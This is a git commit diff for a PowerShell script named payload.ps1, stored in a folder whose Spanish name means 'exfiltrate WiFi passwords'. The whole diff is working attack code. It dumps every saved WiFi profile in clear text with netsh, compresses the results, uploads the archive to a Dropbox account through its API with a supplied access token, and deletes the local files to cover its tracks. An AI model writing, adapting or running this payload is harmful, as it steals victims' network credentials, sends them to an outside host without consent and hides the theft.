d3f46ab6ef3dd086322b605819b544c9c51282ac
flippemen <99625153+dolaraso@users.noreply.github.com>
2024-07-16 14:26:40 -0500

    Update payload.ps1

--- exfiltrar contrasenas wifi/payload.ps1
+++ exfiltrar contrasenas wifi/payload.ps1
@@ -1,32 +1,31 @@
-function DropBox-Upload {
-    [CmdletBinding()]
-    param (
-        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
-        [Alias("f")]
-        [string]$SourceFilePath
-    )
-    $outputFile = Split-Path $SourceFilePath -leaf
-    $TargetFilePath = "/$outputFile"
-    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-    $authorization = "Bearer " + $db
-    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-    $headers.Add("Authorization", $authorization)
-    $headers.Add("Dropbox-API-Arg", $arg)
-    $headers.Add("Content-Type", 'application/octet-stream')
-    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-# Extracción y carga de contraseñas WiFi
-$db = ''
+param($AccessToken)
 $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
 $userDir = "$env:USERPROFILE\Documents\Networks_$folderDateTime"
 New-Item -Path $userDir -ItemType Directory
-netsh wlan show profiles | Select-String ": " | ForEach-Object {
-    $profileName = $_.ToString().Split(":")[1].Trim()
-    netsh wlan show profile name=$profileName key=clear | Out-File -FilePath "$userDir\$profileName.txt"
+
+# Recoger contraseñas de WiFi
+netsh wlan show profiles | ForEach-Object {
+    $profileName = ($_ -split ':')[1].Trim()
+    $details = netsh wlan show profile name="$profileName" key=clear
+    $details | Out-File -FilePath "$userDir\$profileName.txt"
 }
+
+# Comprimir y preparar para subida
 Compress-Archive -Path $userDir -DestinationPath "$userDir.zip"
-Start-Sleep -s 5
-if (-not ([string]::IsNullOrEmpty($db))) { DropBox-Upload -f "$userDir.zip" }
+$file = "$userDir.zip"
+$dropboxUploadPath = "/Networks_$folderDateTime.zip"
+
+# Headers para API de Dropbox
+$headers = @{
+    "Authorization" = "Bearer $AccessToken"
+    "Content-Type" = "application/octet-stream"
+    "Dropbox-API-Arg" = '{"path": "' + $dropboxUploadPath + '","mode": "add","autorename": true}'
+}
+
+# Subida a Dropbox
+Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -InFile $file
+
+# Limpieza
 Remove-Item -Path $userDir -Recurse
-Remove-Item -Path "$userDir.zip"
+Remove-Item -Path $file
+
